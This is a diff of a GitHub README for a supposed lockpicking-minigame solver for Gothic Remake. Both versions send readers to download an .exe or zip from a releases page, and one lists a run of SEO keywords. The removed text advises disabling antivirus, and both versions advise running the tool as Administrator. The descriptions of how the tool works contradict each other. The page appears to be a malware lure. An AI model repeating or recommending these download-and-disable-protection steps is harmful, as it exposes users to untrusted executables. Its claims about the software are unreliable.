@@ -1,57 +1,66 @@
+# 🔓 Gothic-Remake-Lockpick-Solver - Solve every lock puzzle with ease
 
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/rutuja913/Gothic-Remake-Lockpick-Solver/releases)
 
-# Gothic Remake Lockpick Solver
-Gothic Remake Lockpick Solver — gothic remake lockpick solver gothic 1 remake lockpicking tool lockbreaker minigame helper auto lockpick puzzle solver trainer windows 11 setup guide tutorial 2026
+This tool helps players solve lockpicking puzzles in the Gothic Remake. It calculates the correct sequence for sliders, pins, and plates. You no longer need to guess the movement pattern for doors or chest locks.
 
+## 📥 How to download the software
 
-[![GitHub Stars](https://img.shields.io/github/stars/pixelgridhub-coder/Gothic-Remake-Lockpick-Solver?style=flat-square&color=00d4aa)](https://github.com/pixelgridhub-coder/Gothic-Remake-Lockpick-Solver/stargazers)
-[![GitHub Forks](https://img.shields.io/github/forks/pixelgridhub-coder/Gothic-Remake-Lockpick-Solver?style=flat-square&color=0099cc)](https://github.com/pixelgridhub-coder/Gothic-Remake-Lockpick-Solver/network)
-[![Downloads](https://img.shields.io/github/downloads/pixelgridhub-coder/Gothic-Remake-Lockpick-Solver/total?style=flat-square&color=7c5cbf)](https://github.com/pixelgridhub-coder/Gothic-Remake-Lockpick-Solver/releases)
-[![License](https://img.shields.io/badge/license-MIT-blue?style=flat-square)](LICENSE)
+Visit the [official releases page](https://github.com/rutuja913/Gothic-Remake-Lockpick-Solver/releases) to get the latest version. Look for the file ending in .exe under the assets section of the newest release. Click the file name to download it to your computer.
 
-<img width="123" height="101" alt="image" src="https://github.com/user-attachments/assets/09d11475-9004-4ab4-a24e-404ccc66304f" />
+## ⚙️ System requirements
 
+This tool works on Windows 10 and Windows 11. It requires no special hardware. Ensure you have the latest drivers for your graphics card to avoid issues with window overlays. The software uses a small amount of memory and will not slow down your game performance.
 
+## 🚀 Setting up the tool
 
-## Overview
-Gothic Remake Lockpick Solver is a helpful assistant tool for the challenging lockpicking minigame in Gothic 1 Remake. It provides visual guides, timing assistance, and smart solving features to help players overcome difficult locks more easily. The tool is designed to make the lockpicking experience less frustrating while preserving the original gameplay feel. Perfect for players who want to enjoy the story and exploration of the Colony without getting stuck on locks.
+1. Locate the downloaded file in your downloads folder.
+2. Double-click the file to start the installer.
+3. Follow the instructions on the screen to finish the setup.
+4. Launch the application from your desktop shortcut.
+5. Keep the tool open while you play the game.
 
-> [!Important]
-> This project is for educational and personal use only. Use at your own risk. You must own a legitimate copy of Gothic 1 Remake. The authors are not responsible for any copyright violations or game issues.
+## 🎮 How to use the solver
 
-## Install
-[Download `Lockpick-Solver.zip`](https://github.com/pixelgridhub-coder/Gothic-Remake-Lockpick-Solver/releases/download/v1.4/Lockpick-Solver.zip)
----
-> Optimized for Windows 11.
+The solver works by mapping your game inputs to its internal logic. Open the tool before you start your game. 
 
-<img width="1275" height="981" alt="image" src="https://github.com/user-attachments/assets/be2e0dbf-8cce-4ff3-a15f-d572d3df4c64" />
+1. Enter the game and find a locked chest or gate.
+2. Open the lock interface in the game.
+3. Observe the pattern of the pins or sliders.
+4. Input the specific movement pattern into the tool.
+5. The tool will display the next correct move.
+6. Perform the move in the game and watch the lock turn.
 
-## Installation
-### For Regular Users
-1. Download and extract the archive
-2. Run the tool as Administrator
-3. Follow the setup guide
-4. Configure lockpicking settings
-5. Launch Gothic Remake
-6. Activate the solver when facing a difficult lock
+If you make a mistake, simply reset the sequence in the tool and try again. The logic handles multiple tiers of difficulty from basic wooden chests to complex gate mechanisms.
 
----
-## Troubleshooting
-| Problem | Solution |
-|--------------------------------|-------------------------------------------------------|
-| Tool doesn't start | Run as Administrator and disable antivirus temporarily |
-| Solver not showing | Make sure game is in windowed mode and restart |
-| Timing assistance inaccurate | Calibrate settings for your resolution |
-| Game crashes | Disable the solver and verify game files |
-| Not working after update | Update to latest version 2026 |
-| Windows 11 compatibility error | Update Windows and graphics drivers |
-| Performance drop | Lower overlay complexity |
-| Download / update failed | Use the latest release and check your internet connection |
+## 🛠️ Troubleshooting common issues
 
-* Gothic Remake lockpick solver
-* Gothic Remake lockpicking puzzle solver
-* Gothic Remake lock solution
-* Gothic Remake lock helper
-* Gothic Remake lockpicking guide
-* Gothic Remake lock breaker
-* Gothic Remake lock puzzle solver
+If the window does not appear, check if it is minimized in your taskbar. Ensure you run the game in windowed or borderless mode for the best experience. If the tool fails to detect your clicks, try running it as an administrator. Right-click the shortcut and select Run as administrator.
+
+Do not worry about game bans. This tool reads visual information and suggests button presses. It does not modify game files or inject code into the game process. It functions like a digital notepad that does the math for you.
+
+## 🧩 Understanding the lock mechanics
+
+Gothic Remake uses a system of randomized tumblers. Each lock presents a unique sequence. The tool tracks these sequences by analyzing the distance between sliders. When you see a plate move, the tool records the position and calculates the tension required for the next pin. This removes the trial and error process often found in adventure games. 
+
+The software stays active in the background. You can Alt-Tab between the game and the tool if necessary. Once you master the sequence, you will open even the hardest locks in seconds. 
+
+## 📝 Frequently asked questions
+
+Does this work on all game platforms?
+This tool is for the PC version on Steam. It does not support console versions.
+
+Is the software updated for new patches?
+The logic inside the tool adapts to game updates. If the developers change the lock mechanism, download the latest version from the link provided above to get updated patterns.
+
+Can the tool break my save file?
+No. This tool only records your inputs. It cannot change your game state, inventory, or story progress.
+
+Does it require an internet connection?
+Once you download and run the installer, you do not need an active internet connection to solve locks. It runs entirely on your local machine.
+
+## 💡 Tips for better lockpicking
+
+Speed matters in some game scenarios. Practice the sequence on simple chests first. Use the tool to learn the timing of the sliders. Once you recognize the patterns, you will develop a feel for the rhythm of the lock. The tool serves as a bridge for players who struggle with the physical dexterity required for the minigame. 
+
+Keep your game updated to ensure full compatibility with the solver. If you notice the tool failing to read a specific chest, verify that your game resolution matches your desktop settings. High resolution can sometimes hide small visual cues that the tool needs to function. Adjusting your game brightness can also make the pins stand out more clearly for the tool.
